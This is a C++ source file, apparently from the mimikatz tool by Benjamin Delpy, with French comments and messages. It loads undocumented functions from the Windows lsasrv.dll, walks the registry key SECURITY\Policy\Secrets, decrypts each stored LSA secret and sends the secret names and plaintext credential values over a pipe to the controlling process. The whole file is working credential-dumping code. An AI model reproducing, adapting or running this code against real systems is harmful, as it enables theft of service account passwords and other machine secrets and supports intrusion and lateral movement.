/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "secrets.h"

PLSA_I_OPEN_POLICY_TRUSTED LsaIOpenPolicyTrusted = NULL;
PLSA_R_OPEN_SECRET LsarOpenSecret = NULL;
PLSA_R_QUERY_SECRET LsarQuerySecret = NULL;
PLSA_R_CLOSE LsarClose = NULL;

bool searchSECFuncs()
{
	if(!(LsaIOpenPolicyTrusted && LsarOpenSecret && LsarQuerySecret && LsarClose))
	{
		if(HMODULE hLsasrv = GetModuleHandle(L"lsasrv"))
		{
			LsaIOpenPolicyTrusted	= reinterpret_cast<PLSA_I_OPEN_POLICY_TRUSTED>(GetProcAddress(hLsasrv, "LsaIOpenPolicyTrusted"));
			LsarOpenSecret			= reinterpret_cast<PLSA_R_OPEN_SECRET>(GetProcAddress(hLsasrv, "LsarOpenSecret"));
			LsarQuerySecret			= reinterpret_cast<PLSA_R_QUERY_SECRET>(GetProcAddress(hLsasrv, "LsarQuerySecret"));
			LsarClose				= reinterpret_cast<PLSA_R_CLOSE>(GetProcAddress(hLsasrv, "LsarClose"));
		}
		return (LsaIOpenPolicyTrusted && LsarOpenSecret && LsarQuerySecret && LsarClose);
	}
	else return true;
}

__kextdll bool __cdecl getSECFunctions(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream monStream;
	monStream << L"** lsasrv.dll ** ; Statut recherche : " << (searchSECFuncs() ? L"OK :)" : L"KO :(") << endl << endl <<
		L"@LsaIOpenPolicyTrusted = " << LsaIOpenPolicyTrusted << endl <<
		L"@LsarOpenSecret        = " << LsarOpenSecret << endl <<
		L"@LsarQuerySecret       = " << LsarQuerySecret << endl <<
		L"@LsarClose             = " << LsarClose << endl;
	return sendTo(monPipe, monStream.str());
}

__kextdll bool __cdecl getSecrets(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	if(searchSECFuncs())
	{
		bool sendOk = true;
		wstring message;
		LSA_HANDLE hPolicy;
		
		if(NT_SUCCESS(LsaIOpenPolicyTrusted(&hPolicy)))
		{
			HKEY hKeysSecrets;
			if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SECURITY\\Policy\\Secrets", 0, KEY_READ, &hKeysSecrets) == ERROR_SUCCESS)
			{
				DWORD nbKey, maxKeySize;
				if(RegQueryInfoKey(hKeysSecrets, NULL, NULL, NULL, &nbKey, &maxKeySize, NULL, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
				{
					for(DWORD i = 0; (i < nbKey) && sendOk; i++)
					{
						DWORD buffsize = (maxKeySize+1) * sizeof(wchar_t);
						LSA_UNICODE_STRING monNomSecret = {0, 0, new wchar_t[buffsize]};
						
						if(RegEnumKeyEx(hKeysSecrets, i, monNomSecret.Buffer, &buffsize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
						{
							monNomSecret.Length = monNomSecret.MaximumLength = static_cast<USHORT>(buffsize * sizeof(wchar_t));
							message.assign(L"\nSecret     : "); message.append(mod_text::stringOfSTRING(monNomSecret)); message.push_back(L'\n');
							
							LSA_HANDLE hSecret;
							if(NT_SUCCESS(LsarOpenSecret(hPolicy, &monNomSecret, SECRET_QUERY_VALUE, &hSecret)))
							{
								LSA_SECRET * monSecret = NULL;
								if(NT_SUCCESS(LsarQuerySecret(hSecret, &monSecret, NULL, NULL, NULL)))
								{
									message.append(L"Credential : "); message.append(mod_text::stringOrHex(reinterpret_cast<PBYTE>(monSecret->Buffer), monSecret->Length)); message.push_back(L'\n');
									LsaFreeMemory(monSecret);
								}
								else message.append(L"Erreur : Impossible de récupérer le secret\n");
								LsarClose(&hSecret);
							}
							else message.append(L"Erreur : Impossible d\'ouvrir le secret\n");
						}
						delete[] monNomSecret.Buffer;
						sendOk = sendTo(monPipe, message);
					}
					message.clear();
				} else message.assign(L"Erreur : Impossible d\'obtenir des information sur le registre secret\n");
				RegCloseKey(hKeysSecrets);
			}
			else message.assign(L"Erreur : Impossible d\'ouvrir la clé Secrets\n");
			LsarClose(&hPolicy);
		}
		else message.assign(L"Erreur : Impossible d\'ouvrir la politique\n");
		
		if(!message.empty())
			sendOk = sendTo(monPipe, message);
		
		return sendOk;
	}
	else return getSECFunctions(monPipe, mesArguments);
}
